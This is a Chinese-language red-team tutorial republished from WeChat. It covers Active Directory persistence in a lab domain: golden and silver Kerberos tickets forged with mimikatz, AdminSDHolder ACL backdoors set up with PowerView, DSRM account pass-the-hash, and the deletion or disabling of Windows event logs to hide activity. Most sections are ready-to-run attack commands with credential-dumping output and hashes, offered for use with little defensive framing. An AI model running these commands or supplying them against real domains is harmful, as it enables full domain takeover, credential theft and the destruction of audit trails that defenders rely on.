> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/g_ikzzEPD8kBX8BmAdkukQ)

0x01 金票
=======

可以使用 krbtgt 的 NTLM hash 创建作为任何用户的有效 TGT。要伪造黄金票据的前提是知道域的 SID 和 krbtgt 账户的 hash 或者 AES-256 值。

1.1 收集 krbtgt 密码信息
------------------

```
privilege::debuglsadump::lsa /inject /name:krbtgt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAqjhO6cYdPBYtu8qPMPtlmLzyiceW7gEkItJMnLEMCnzBaB9Ikqic9XNQ/640?wx_fmt=png)

得到 krbtgt 的 hash：

```
c73caed3bc6f0a248e51d37b9a8675fa
```

域 sid 值：

```
S-1-5-21-151877218-3666268517-4145415712
```

1.2 金票利用
--------

使用 mimikatz 伪造 kerberos 票证

**生成 gold.kribi**

```
mimikatz "kerberos::golden /domain:redteam.local /sid:S-1-5-21-151877218-3666268517-4145415712/krbtgt:c73caed3bc6f0a248e51d37b9a8675fa /user:administrator/ticket:gold.kirbi"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSA3YzVfaqmBV8sXCfIFlb2UTVoUVmw4A5SYickCZMzBkl2735peZyasnw/640?wx_fmt=png)

可以看到没有任何票证。

**导入 gold.kribi**

```
kerberos::ptt C:\Users\jack\Desktop\gold.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAoCR59jHTPaEbLWxqbJI0S9QVZicrvmd6U5icXuicugYTNgKcNLdHGujDA/640?wx_fmt=png)

成功导入 administrator 票据。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAcfA5bzecdhaBSjlZCXNk37gVy4vSLBInD8ZVW30LSJ0n7TClAFOQKg/640?wx_fmt=png)

可以通过事件管理器查看到是以 administrator 来登录的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAIfqCnRWjp4HzmtcH6uVGe1aAYR1MHlIVnxZASUMwkmvAxmp9nIXNIw/640?wx_fmt=png)

0x02 银票
=======

如果我们拥有服务的 hash，就可以给自己签发任意用户的 TGS 票据。金票是伪造 TGT 可用于访问任何 Kerberos 服务，而银票是伪造 TGS，仅限于访问针对特定服务器的任何服务。

这里使用 CIFS 服务，该服务是 windows 机器之间的文件共享。

2.1 获取 sid
----------

```
whoami /user
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAHQaExYiayDR9xKpH0ia79PxoVyMkxQicELqzY1Tr5CsauSvicQlg9KEcEA/640?wx_fmt=png)

2.2 导出服务账号的 NTLM Hash
---------------------

```
privilege::Debugsekurlsa::logonpasswords
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAytFs9pwsfIMjFhGmvm7AO9CfIeh4eS322gmh5Kic2np5DsyRxxubMcA/640?wx_fmt=png)

2.3 创建银票
--------

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAN1shKrq6o2MKvw9PzX2ZOOWlV1EYnic60H2zKm28OqJPUJibOzFEs0aw/640?wx_fmt=png)

```
kerberos::golden /domain:redteam.local/sid:S-1-5-21-151877218-3666268517-4145415712/target:DC.redteam.local/service:cifs /rc4:0703759771e4bed877ecd472c95693a5/user:administrator /ptt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAWrD9VA79c28Qgwh5GVTV3YUUdvOJx2fI0rghQAibHURCAGniaYhPr4cg/640?wx_fmt=png)

psexec 获取 DC 机器 cmd

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAu91hXom0BmNJkYicDrsvAzZO6CARcCruvJ8ibzibWq84N1T0UNDfFfdHA/640?wx_fmt=png)

0x03 AdminSDHolder 组
====================

AdminSDHolder 是一个特殊的 AD 容器，具有一些默认安全权限，用作受保护 AD 账户和组的模板，当我们获取到域控权限，就可以通过授予该用户对容器进行滥用，使该用户成为域管。

默认情况下，该组的 ACL 被复制到所有 “受保护组” 中。这样做是为了避免有意或无意地更改这些关键组。但是，如果攻击者修改了 AdminSDHolder 组的 ACL，例如授予普通用户完全权限，则该用户将拥有受保护组内所有组的完全权限（在一小时内）。如果有人试图在一小时或更短的时间内从域管理员中删除此用户（例如），该用户将回到组中。

```
在server2000中引入，默认包含如下的组：AdministratorsDomainAdminsAccountOperatorsBackupOperatorsDomainControllersEnterpriseAdminsPrintOperatorsReplicatorRead-only DomainControllersSchemaAdminsServerOperators
```

其中 Administrators、Domain Admins、Enterprise Admins 组对 AdminSDHolder 上的属性具有写权限，受保护的 ad 账户和组的具备 admincount 属性值为 1 的特征。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAC8xYrBZq4b7kOyiagI6hc0bUO53KurA0xXCzz4CFGdibJQ5ibkjZdCwqg/640?wx_fmt=png)

3.1 使用 powerview 查询
-------------------

查询 ad 保护的域的用户

```
Get-NetUser-AdminCount|select samaccountname
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSArmVdsy7VWBKUrv3iah34H89Nh0vHCUUpN9Akbo8kAxIiaVnxaEoX0e2w/640?wx_fmt=png)

查询域中受 ad 保护的所有组

```
Get-netgroup -AdminCount| select name
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAl1wyfOrg24ic33W4zLDvxJribZOhTpaAY0sIYvUDCb1SrLEgU82UsxOw/640?wx_fmt=png)

3.2 使用 ActiveDirectory
----------------------

查询 ad 保护的域中所有的用户和组

```
Import-ModuleActiveDirectoryGet-ADObject-LDAPFilter"(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))"|select name
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAlQQHMmQSG4NK0eB1wpVe1w5icSeJ4vE1I26zwOtlicdpjxRplbJcYTUw/640?wx_fmt=png)

3.3 添加用户
--------

添加 jack 用户对其有完全控制权限。

```
Add-DomainObjectAcl-TargetIdentityAdminSDHolder-PrincipalIdentity jack -RightsAll
```

然后验证下，这里的 sid 为 jack 用户的。

```
Get-DomainObjectAcl adminsdholder | ?{$_.SecurityIdentifier-match "S-1-5-21-151877218-3666268517-4145415712-1106"} | select objectdn,ActiveDirectoryRights |sort -Unique
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAYooyWDyXal5Po1A4ohtXlXe8fTDIwa52DicKaTzThvyicPyUeAyf6mSg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAzhNhSCQyAicpzuAgkCwvOCAzduV6VYgvy3F4uJ8ACuytl0SNtvhVc8w/640?wx_fmt=png)

默认会等待 60 分钟，可以通过修改注册表来设置为 60 秒后触发。

```
reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 1/f
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAyvnCnxudYgV4Yh6IZiavCjicdNLtMXjxfLNJibVDUbYayKhk759S3K4Ig/640?wx_fmt=png)

3.4 恢复
------

恢复触发时间

```
reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 120/f
```

取消 jack 用户对 adminSDHolder 的权限

```
Remove-DomainObjectAcl-TargetSearchBase"LDAP://CN=AdminSDHolder,CN=System,DC=redteam,DC=local"-PrincipalIdentity jack -RightsAll-Verbose
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAo6JDfYQyE2DBL7nfwvzFhgYF2ULf1huuBrbY9fpAoYK3Hibbh7L6GHw/640?wx_fmt=png)

0x04 DSRM 凭证
============

每个 DC 内部都有一个本地管理员账户，在该机器上拥有管理员权限。

4.1 获取本地管理员 hash
----------------

```
token::elevatelsadump::sam
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAo6JDfYQyE2DBL7nfwvzFhgYF2ULf1huuBrbY9fpAoYK3Hibbh7L6GHw/640?wx_fmt=png)

得到 hash 为：

```
852a844adfce18f66009b4f14e0a98de
```

4.2 检查是否工作
----------

如果注册表项的值为 0 或者不存在，需要将其设置为 2。

检查 key 是否存在并且获取值：

```
Get-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior
```

如果不存在则创建值为 2 的键：

```
New-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2-PropertyType DWORD
```

如果存在但是不为 2 设置为 2：

```
Set-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSA1ljNicrUUS5ziaPm6XFoIgFS3DSKDMsVjg3ML2vVMkfjHS662ibDmDz0A/640?wx_fmt=png)

4.3 PTH 域控
----------

```
sekurlsa::pth /domain:DC /user:Administrator/ntlm:852a844adfce18f66009b4f14e0a98de/run:powershell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAKmSWlnO42mak8JUoUjdwPwIyfEcr3Mr5EOJWFwnu8AdT21ZLXAzUXA/640?wx_fmt=png)

0x05 规避 Windows 事件日志记录
======================

在做完一些渗透测试清理痕迹是很有必要的一个环节，包括在一些渗透还未结束也要清理掉一些操作日志。在情报收集反溯源等等大多都是采用 windows 事件日志中。

5.1 查看 windows 日志
-----------------

### 5.1.1 事件管理器

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSA4RGibWbgTouMNlFMavPCahgpPgRwU1rgkrD7juNqbU82HcPRXL7qbvg/640?wx_fmt=png)

### 5.1.2 powershell

管理员权限运行查看安全类别的日志：

```
Get-WinEvent-FilterHashtable@{log;}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSALOe6Nw2BfMPW2xyesez8pyYh1PSl0Y9Rhu3J5NTLAKWMDHyJ9OzDrw/640?wx_fmt=png)

5.2 windows 日志清除方法
------------------

### 5.2.1 wevtutil.exe

**统计日志列表数目信息等：**

```
wevtutil.exe gli Applicationwevtutil.exe gli Security
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAYzdlMBdw8KUj2iaY3S2fqicgTtV7SDsMiccvR1Bq2O7MuJCpQOicsKE56A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAURQIgtGxnGBB0icrzXG8ibnCBLicwoMfY9h71bJkbw147rWWmeq2t26KQ/640?wx_fmt=png)

**查询指定类别的 (这里以 security 举例):**

```
wevtutil qe Security/f:text
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSANGZexhwzZfichB9k5ew3kOOR34V0k68TRnVDDowW5ADtoSibia4LzEfSw/640?wx_fmt=png)

**删除指定类别：**

```
wevtutil cl security
```

原本大量日志信息

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSArzp9Ao6toPbojyorS0K9QzYe5ECbwaZZUEVxfkX4rr0oSibSJU28Y0g/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAoVVKY8yDKrx3Ml2xRkrEUciab4d2x5SPrgIEtnb7nnglB1xUnzFj2Mw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAV1PT786GlbZ0C1bAiagw6dKvjrT3ibDmicV2TkXrrnQdtibico98UzvaibIA/640?wx_fmt=png)

但是会留下一个事件 id 为 1102 的日志清除日志

### 5.2.2 powershell 清除日志

**查看指定事件 id：**

```
Get-EventLogSecurity-InstanceId4624,4625
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAJlUpqMMOMNJWibt6pq7AibBjYhQKqAOKJW1phM4fZK1gEiaahMwnia8sGA/640?wx_fmt=png)

**删除指定类别日志：**

```
Clear-EventLog-LogNameSecurity
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAk6yUqPJX7vWUI1fIk0MxIfZwQaFcpRliaOBJbWiaNsfZGqqdLueocSMw/640?wx_fmt=png)

### 5.2.3 Phantom 脚本

该脚本可以让日志功能失效，无法记录。他会遍历日志进程的线程堆栈来终止日志服务线程。

添加一个用户可以看到产生了日志

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAq6iaouQpxD3y44jHC436eK1EiagibyOu1aJ5AfXKwv8ZzuicDGvKKwdUzQ/640?wx_fmt=png)

我们再给删除

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAy6zjC0ZM9bOBdQET72ysjxVOaYzxFI9OPMiaemMCjWxJEqAGQ2RBxRQ/640?wx_fmt=png)

运行 ps1 脚本：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSAtdh4CmUSzAgCFaKJOEKqs3nuoIZHE8dE4EwqYIxlGCWicydGmVe3Fdw/640?wx_fmt=png)

再次添加用户查看日志：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibv6HFgEibXjjPKFXIKduWSA4q5ZvDicTOVhzvcnWRd24EYVFRm5kwCtgW4WusjrEno2FoSHvV4wib4w/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**

**推荐阅读：**

**祝各位小伙伴们七夕快乐！**

**早生贵子，一发三胞胎  
**

**嘿嘿**

**点赞，转发，在看**

原创投稿作者：11ccaab

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)